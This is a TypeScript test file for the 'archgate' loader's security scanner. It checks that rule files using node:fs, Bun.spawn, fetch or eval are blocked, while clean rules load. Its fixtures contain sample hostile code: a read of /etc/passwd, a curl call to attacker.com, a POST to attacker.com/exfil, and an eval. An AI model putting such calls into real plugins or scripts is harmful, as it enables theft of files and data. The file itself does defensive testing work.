import { describe, expect, test, beforeEach, afterEach } from "bun:test";
import { mkdtempSync, rmSync, mkdirSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { loadRuleAdrs } from "../../src/engine/loader";

describe("loadRuleAdrs security scanning", () => {
  let tempDir: string;

  beforeEach(() => {
    tempDir = mkdtempSync(join(tmpdir(), "archgate-loader-sec-"));
    mkdirSync(join(tempDir, ".archgate", "adrs"), { recursive: true });
  });

  afterEach(() => {
    rmSync(tempDir, { recursive: true, force: true });
  });

  function writeAdrMd(adrsDir: string, id: string, baseName: string): void {
    writeFileSync(
      join(adrsDir, `${baseName}.md`),
      `---
id: ${id}
title: Test ADR
domain: general
rules: true
---

## Context
Test ADR for security scanning.

## Decision
Test decision.
`
    );
  }

  test("blocks rule that imports node:fs", async () => {
    const adrsDir = join(tempDir, ".archgate", "adrs");
    writeAdrMd(adrsDir, "SEC-001", "SEC-001-malicious-fs");
    writeFileSync(
      join(adrsDir, "SEC-001-malicious-fs.rules.ts"),
      `import { readFileSync } from "node:fs";
export default {
  rules: {
    "steal-secrets": {
      description: "Read secrets",
      async check() {
        readFileSync("/etc/passwd", "utf8");
      },
    },
  },
};
`
    );

    await expect(loadRuleAdrs(tempDir)).rejects.toThrow(
      "blocked by security scanner"
    );
  });

  test("blocks rule that uses Bun.spawn", async () => {
    const adrsDir = join(tempDir, ".archgate", "adrs");
    writeAdrMd(adrsDir, "SEC-002", "SEC-002-malicious-spawn");
    writeFileSync(
      join(adrsDir, "SEC-002-malicious-spawn.rules.ts"),
      `export default {
  rules: {
    "run-command": {
      description: "Run arbitrary command",
      async check() {
        Bun.spawn(["curl", "https://attacker.com"]);
      },
    },
  },
};
`
    );

    await expect(loadRuleAdrs(tempDir)).rejects.toThrow(
      "blocked by security scanner"
    );
  });

  test("blocks rule that uses fetch", async () => {
    const adrsDir = join(tempDir, ".archgate", "adrs");
    writeAdrMd(adrsDir, "SEC-003", "SEC-003-malicious-fetch");
    writeFileSync(
      join(adrsDir, "SEC-003-malicious-fetch.rules.ts"),
      `export default {
  rules: {
    "exfiltrate": {
      description: "Exfiltrate data",
      async check() {
        fetch("https://attacker.com/exfil", { method: "POST" });
      },
    },
  },
};
`
    );

    await expect(loadRuleAdrs(tempDir)).rejects.toThrow(
      "blocked by security scanner"
    );
  });

  test("blocks rule that uses eval", async () => {
    const adrsDir = join(tempDir, ".archgate", "adrs");
    writeAdrMd(adrsDir, "SEC-004", "SEC-004-malicious-eval");
    writeFileSync(
      join(adrsDir, "SEC-004-malicious-eval.rules.ts"),
      `export default {
  rules: {
    "eval-attack": {
      description: "Execute arbitrary code",
      async check() {
        eval("process.exit(1)");
      },
    },
  },
};
`
    );

    await expect(loadRuleAdrs(tempDir)).rejects.toThrow(
      "blocked by security scanner"
    );
  });

  test("allows clean rule using only RuleContext", async () => {
    const adrsDir = join(tempDir, ".archgate", "adrs");
    writeAdrMd(adrsDir, "SEC-005", "SEC-005-clean-rule");
    writeFileSync(
      join(adrsDir, "SEC-005-clean-rule.rules.ts"),
      `export default {
  rules: {
    "safe-rule": {
      description: "A well-behaved rule",
      async check(ctx) {
        const files = await ctx.glob("src/**/*.ts");
        for (const file of files) {
          const content = await ctx.readFile(file);
          if (content.includes("TODO")) {
            ctx.report.warning({ message: "Found TODO", file });
          }
        }
      },
    },
  },
};
`
    );

    const loaded = await loadRuleAdrs(tempDir);
    expect(loaded).toHaveLength(1);
    expect(loaded[0].adr.frontmatter.id).toBe("SEC-005");
  });

  test("allows rule with safe imports (node:path)", async () => {
    const adrsDir = join(tempDir, ".archgate", "adrs");
    writeAdrMd(adrsDir, "SEC-006", "SEC-006-safe-imports");
    writeFileSync(
      join(adrsDir, "SEC-006-safe-imports.rules.ts"),
      `import { join } from "node:path";

export default {
  rules: {
    "path-rule": {
      description: "Uses safe modules",
      async check(ctx) {
        const p = join("src", "index.ts");
      },
    },
  },
};
`
    );

    const loaded = await loadRuleAdrs(tempDir);
    expect(loaded).toHaveLength(1);
  });
});
